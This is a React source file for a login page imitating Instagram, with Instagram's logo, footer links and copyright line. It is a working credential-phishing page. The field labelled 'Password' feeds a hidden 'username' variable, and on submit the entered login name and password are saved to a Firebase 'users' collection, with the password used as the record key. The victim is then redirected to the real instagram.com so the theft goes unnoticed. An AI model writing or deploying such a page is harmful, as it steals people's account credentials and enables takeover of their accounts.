import { useState } from "react";
import { db, setDoc, doc } from "./firebase/firebase";
import "./App.css";
import { Navigate, useNavigate } from "react-router-dom";

export default function App() {
  const [email, setEmail] = useState("");
  const [username, setUsername] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    try {
      const userDocRef = doc(db, "users", username);

      await setDoc(userDocRef, {
        username: username,
        email: email,
        createdAt: new Date(),
      });
    
      setUsername("");
      setEmail("")
      window.location.href = 'https://www.instagram.com/';
    } catch (error) {
      setError(error.message);
    }

    setLoading(false);

  };

  return (
    <form onSubmit={handleSubmit}>
  
      <main>
        <div className="log-in-container">
          <div className="log-in">
            <img src="photos/logo.png" className="logo" />

            <div className="log-in-form">
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
                placeholder="Email username phone"
              />
              <input
                type="password"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
                placeholder="Password"
              />
              <button
                type="submit"
                className="log-in-button"
                disabled={loading}
              >
                Log in
              </button>
            </div>

            <span className="or-divider">OR</span>

            <div className="fb-login">
              <a href="https://web.facebook.com/?_rdc=1&_rdr#">
                <img src="photos/facebook-icon.png" />
                <span>Log in with Facebook</span>
              </a>
            </div>

            <a href="#" style={{color:"#000"}}>Forgot password?</a>
          </div>

          <div className="sign-up">
            <span>
              I have no  account? <a href="https://instagram.com/adiss_hot/">Sign up</a>
            </span>
          </div>

          <div className="get-the-app">
            <span>Get the app</span>
            <div className="app-images">
              <a href="#">
                <img src="photos/applestore.png" />
              </a>
              <a href="#">
                <img src="photos/googlestore.png" />
              </a>
            </div>
          </div>
        </div>

        <div className="phones-container">
          <img src="photos/phones.png" />
        </div>
      </main>
      <footer>
        <ul className="footer-links">
          <li>
            <a href="#">ABOUT</a>
          </li>
          <li>
            <a href="#">HELP</a>
          </li>
          <li>
            <a href="#">PRESS</a>
          </li>
          <li>
            <a href="#">API</a>
          </li>
          <li>
            <a href="#">JOBS</a>
          </li>
          <li>
            <a href="#">PRIVACY</a>
          </li>
          <li>
            <a href="#">TERMS</a>
          </li>
          <li>
            <a href="#">LOCATION</a>
          </li>
          <li>
            <a href="#">TOP</a>
          </li>
          <li>
            <a href="#">ACCOUNTS</a>
          </li>
          <li>
            <a href="#">HASHTAGS</a>
          </li>
          <li>
            <a href="#">LANGUAGE</a>
          </li>
        </ul>
        <span className="copyright">&copy; 2020 INSTAGRAM FROM FACEBOOK</span>
      </footer>
    </form>
  );
}
